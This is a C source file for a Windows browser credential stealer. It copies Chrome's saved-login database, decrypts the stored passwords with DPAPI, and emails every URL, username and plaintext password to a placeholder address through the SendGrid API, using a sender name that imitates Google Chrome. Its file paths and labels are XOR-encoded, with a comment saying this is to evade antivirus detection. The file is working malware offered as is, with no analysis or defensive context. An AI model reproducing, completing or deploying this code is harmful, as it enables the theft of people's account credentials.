#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <curl/curl.h>
#include <wincrypt.h>
#include "sqlite3.h"

typedef struct __MAIL_CT
{
	char *api_key, *from, *to, *subject, *content;
} MAIL_CT;

size_t write_callback(char *ptr, size_t size, size_t nmemb, void *userdata)
{
	#ifdef DEBUG
	time_t t = time(NULL);
	FILE *fd = fopen("api_log.txt", "a");
	if (fd != NULL)
	{
		fwrite(ptr, size, nmemb, fd);
		fprintf(fd, "\t\t%s", ctime(&t));
		fclose(fd);
	}
	#endif
	return nmemb;
}

int send_mail(MAIL_CT *M_CT)
{
		CURL *curl;
  		CURLcode res;
 		char *post_data = (char*) calloc(4096, 1);
 		sprintf(post_data, "{\"personalizations\": [{\"to\": [{\"email\": \"%s\"}]}],\"from\": {\"email\": \"%s\"},\"subject\": \"%s\",\"content\": [{\"type\": \"text/plain\", \"value\": \"%s\"}]}",
 						M_CT->to, M_CT->from, M_CT->subject, M_CT->content);
 		struct curl_slist *headers = NULL;
  		curl = curl_easy_init();
  		char *auth = (char *)calloc(128, 1);
  		sprintf(auth, "authorization: Bearer %s", M_CT->api_key);
  		if(curl)
  		{
    		headers = curl_slist_append(headers, "Content-Type: application/json");
    		headers = curl_slist_append(headers, auth);
    		curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    		curl_easy_setopt(curl, CURLOPT_URL, "https://api.sendgrid.com/v3/mail/send");
    		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
    		curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(post_data));
    		res = curl_easy_perform(curl);
    		curl_easy_cleanup(curl);
  		}
  		free(post_data);
  		free(auth);
  		if(res != CURLE_OK) return -1;
  		return 0;
}


#define PASSWD 1
#define URL 2
#define UNAME 3
#define T_PATH 4
#define TMP_PATH 5

char *get_str(int id) {
	/*	for av	*/
	char dur[] = {102, 97, 127, 0};
	char dus[] = {102, 96, 118, 97, 125, 114, 126, 118, 0};
	char dpw[] = {99, 114, 96, 96, 100, 124, 97, 119, 0};
	char dph[] = {79, 82, 99, 99, 87, 114, 103, 114, 79, 95, 124, 112, 114, 127, 79, 84, 124, 124, 116, 127, 118, 79, 80, 123, 97, 124, 126, 118, 79, 70, 96, 118, 97, 51, 87, 114, 103, 114, 79, 87, 118, 117, 114, 102, 127, 103, 79, 95, 124, 116, 122, 125, 51, 87, 114, 103, 114, 0};
	char dtmp[] = {79, 82, 99, 99, 87, 114, 103, 114, 79, 95, 124, 112, 114, 127, 79, 71, 118, 126, 99, 0};
	char *r, *p;
	int i=0;
	r = (char *) calloc(64, 1);
	memset(r, 0, 64);
	switch (id) {
		case PASSWD: p = dpw; break;
		case URL: p = dur; break;
		case UNAME: p = dus; break;
		case T_PATH: p = dph; break;
		case TMP_PATH: p = dtmp; break;
	}
	for (; i<strlen(p); i++) r[i] = p[i] ^ 19;
	return r;
}

void ft_log_time(char *ptr)
{
	time_t t = time(NULL);
	sprintf(ptr, "DWM %s", ctime(&t));
	int i;
	for (i=4;i<64;i++)
	{
		if (ptr[i] == '\n')
		{
			ptr[i] = 0;
			break;
		}
	}
}

void decPasswd(const void *Cipher, int sz, char *dest) {
	int i, pos=0;
	DATA_BLOB bData;
	bData.pbData = new BYTE[sz];
	for (i=0; i<sz; i++) bData.pbData[i] = (BYTE) (((char *) Cipher)[i]);
	bData.cbData = sz;
	DATA_BLOB PlainText;
	PlainText.pbData = NULL;
	if (CryptUnprotectData(&bData, NULL, NULL, NULL, NULL, 0, &PlainText));
	for (i=0; i<32; i++) {
		if (PlainText.pbData[i] < 0x20) break;
		pos++;
	}
	memcpy(dest, (void*)PlainText.pbData, pos);
}

char *getRandomStr(int sz) {
	char *r = (char *) calloc(sz+1, 1);
	for (int i=0; i<sz; i++) r[i] = '0' + rand()%10;
	return r;
}

int main()
{
	srand(time(NULL));
	sqlite3 *db;
	char path[128];
	memset(path, 0, 128);
	sprintf(path, "C:\\Users\\%s%s", getenv("USERNAME"), get_str(T_PATH));
	FILE *fdi = fopen(path, "rb");
	memset(path, 0, 128);
	sprintf(path, "C:\\Users\\%s%s\\%s.db", getenv("USERNAME"), get_str(TMP_PATH), getRandomStr(16));
	FILE *fdo = fopen(path, "wb");
	if (fdi == NULL || fdo == NULL) {return -1;}
	int c=0;
	while ((c = fgetc(fdi)) != EOF) fputc(c, fdo);
	fclose(fdi);
	fclose(fdo);
	if (sqlite3_open(path, &db)) {
		return -1;
	}
	sqlite3_stmt *stm;
	if (sqlite3_prepare(db, "SELECT * FROM 'logins'", 512, &stm, NULL)) {
		sqlite3_close(db);
		return -2;
	}
	char pass[64];
	char login_data[0xfffff];
	memset(login_data, 0, 0xfffff);
	while (sqlite3_step(stm) == SQLITE_ROW) {
		sprintf(login_data + strlen(login_data), "%s = %s ", get_str(URL), sqlite3_column_text(stm, 1));
		sprintf(login_data + strlen(login_data), "%s = %s ", get_str(UNAME), sqlite3_column_text(stm, 3));
		int sz = sqlite3_column_bytes(stm, 5);
		memset(pass, 0, 64);
		decPasswd(sqlite3_column_blob(stm, 5), sz, pass);
		sprintf(login_data + strlen(login_data), "%s = %s ", get_str(PASSWD), pass);
	}
	sqlite3_close(db);
	time_t t = time(NULL);
	MAIL_CT *M_CT = (MAIL_CT*) calloc(sizeof(MAIL_CT), 1);
	M_CT->api_key = "sendgrid api key";
	M_CT->from = "google-chrome@maths.org";
	M_CT->to = "your@email.com";
	char *subject = (char *)calloc(64, 1);
	ft_log_time(subject);
	M_CT->subject = subject;
	M_CT->content = login_data;
	send_mail(M_CT);
	return 0;
}
